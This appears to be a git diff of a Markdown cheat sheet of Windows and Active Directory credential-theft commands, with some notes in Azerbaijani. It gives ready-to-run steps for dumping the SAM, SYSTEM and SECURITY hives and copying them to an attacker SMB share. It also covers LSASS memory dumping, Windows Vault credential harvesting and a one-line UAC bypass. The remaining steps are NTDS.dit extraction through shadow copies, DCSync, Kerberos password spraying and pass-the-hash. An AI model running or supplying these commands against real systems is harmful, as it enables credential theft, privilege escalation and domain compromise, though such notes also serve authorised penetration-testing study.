@@ -1,66 +1,93 @@
-
+# SAM Dump
 
 SAM ( Security Account Manager )
+
 C:\Windows\System32\config\SAM ( NTLM Hashes ) HKLM\SAM
+
 C:\Windows\System32\config\SYSTEM ( Decrypted Function ) HKLM\SYSTEM
+
 C:\Windows\System32\config\SECURITY ( Security Policy ) HKLM\SECURITY\Policy\Secrets
 
 Shadow Copy:
+
 1) Run as nt authority\system
+
 psexec.exe -s -i cmd.exe
 
 reg.exe save HKEY_LOCAL_MACHINE\SYSTEM C:\Temp\SYSTEM /y 
+
 reg.exe save HKEY_LOCAL_MACHINE\SAM C:\Temp\SAM /y
+
 reg.exe save HKEY_LOCAL_MACHINE\SECURITY C:\Temp\SECURITY /y
 
-Linux:
+**Linux:**
+
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support Labaratory /home/sako/Labaratory
 
-Windows:
+**Windows:**
+
 copy SYSTEM \\192.168.0.250\Labaratory
 
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
    User       RID            LMHASH                            NTLMHASH
 
 netexec smb <IP> --local-auth -u <USER> -p <PASS> --lsa
+
 netexec smb <IP> --local-auth -u <USER> -p <PASS> --sam
 
 
-====================================================================================================================================================================
+
+===================================================================================================================================================================
 
 
 LSASS Dump Technique:
+
 HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+
 RunAsPPL = 1 olarsa mümkün deyil.
+
 RunAsPPL = 0 olarsa davam et
+
 
 1) Task Manager --> Local Security Authority Process --> Create dump file ( %temp% )
 
 CMD: tasklist /svc
+
 PowerShell: Get-Process lsass
 
 2) rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
+
 3) pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 
 
-====================================================================================================================================================================
+===================================================================================================================================================================
 
 
 Windows Vault:
+
 %SystemRoot%\System32\config\systemprofile\AppData\Local\Microsoft\Vault\
+
 %UserProfile%\AppData\Local\Microsoft\Vault\
+
 %UserProfile%\AppData\Local\Microsoft\Credentials\
+
 %UserProfile%\AppData\Roaming\Microsoft\Vault\
+
 %ProgramData%\Microsoft\Vault\
+
 %SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
 
 1) rundll32 keymgr.dll,KRShowKeyMgr
-2) cmdkey /list
+
+3) cmdkey /list
 
 Target: Domain:interactive=SRV01\mcharles
+
     Type: Domain Password
+    
     User: SRV01\mcharles
 
 3) runas /savecred /user:SRV01\mcharles cmd
@@ -68,34 +95,50 @@ Target: Domain:interactive=SRV01\mcharles
 4) UAC Bypass: reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
 
 
-=====================================================================================================================================================================
+===================================================================================================================================================================
 
 
 NTDS.dit
+
 C:\Windows\NTDS\ntds.dit
 
 1) ./username-anarchy -i <NAMES_PATH>
 
 Kerbrute: Kerberos TGT requests Event ID 4768
+
 kerbrute userenum -d company.local --dc 10.10.10.5 users.txt
+
 kerbrute passwordspray -d company.local users.txt Winter2025!
+
 kerbrute bruteuser -d company.local passwords.txt ali.aliyev
+
 
 netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 
+
 vssadmin create shadow /for=C:
+
+
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
+
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
 
+
 python3 secretsdump.py company.local/admin:Pass@10.10.10.5
+
 python3 secretsdump.py -just-dc company.local/admin:Pass@DC-IP
 
+
 DCSync (NTDS olmadan NTDS nəticəsi)
+
 secretsdump.py -just-dc-user krbtgt company.local/admin@DC-IP
+
 
 python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 
+
 Pass The Hash
+
 evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 
 
